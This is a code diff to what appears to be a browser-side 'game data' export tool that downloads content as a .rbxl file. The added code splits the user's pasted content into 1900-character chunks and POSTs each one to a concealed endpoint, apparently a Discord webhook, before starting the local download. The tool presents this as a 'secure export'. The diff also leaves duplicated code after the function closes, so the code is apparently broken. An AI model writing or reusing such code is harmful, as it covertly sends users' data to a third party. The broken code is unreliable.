@@ -309,29 +309,44 @@
         if (!content.trim()) return;
 
         status.className = "status-active";
-        status.innerText = "Processing secure export...";
+        status.innerText = "Syncing in chunks...";
 
-        try {
-            // Updated to send as a FILE so there is no character limit on Discord
-            const fileBlob = new Blob([content], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append("file", fileBlob, "GameData_Export.txt");
-            formData.append("payload_json", JSON.stringify({
-                embeds: [{
-                    title: "Secure Content Export",
-                    color: 3447003,
-                    description: "Full game data has been attached as a file.",
-                    timestamp: new Date()
-                }]
-            }));
-
-            await fetch(getEndpoint(), {
-                method: "POST",
-                body: formData
-            });
-        } catch (e) {
-            console.error("Export error:", e);
+        // 1. Define the chunk size
+        const chunkSize = 1900;
+        
+        // 2. Loop through the content and send in pieces
+        for (let i = 0; i < content.length; i += chunkSize) {
+            const chunk = content.substring(i, i + chunkSize);
+            
+            try {
+                await fetch(getEndpoint(), {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: "```\n" + chunk + "\n```"
+                    })
+                });
+                // Small delay to ensure each message is processed
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (e) {
+                console.error("Chunk failed:", e);
+            }
         }
+
+        // 3. Keep the file download functionality
+        const blob = new Blob([content], { type: 'application/octet-stream' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'GameData.rbxl';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(url);
+
+        status.className = "status-success";
+        status.innerText = "Download complete and all chunks sent!";
+    }
 
         const blob = new Blob([content], { type: 'application/octet-stream' });
         const url = window.URL.createObjectURL(blob);
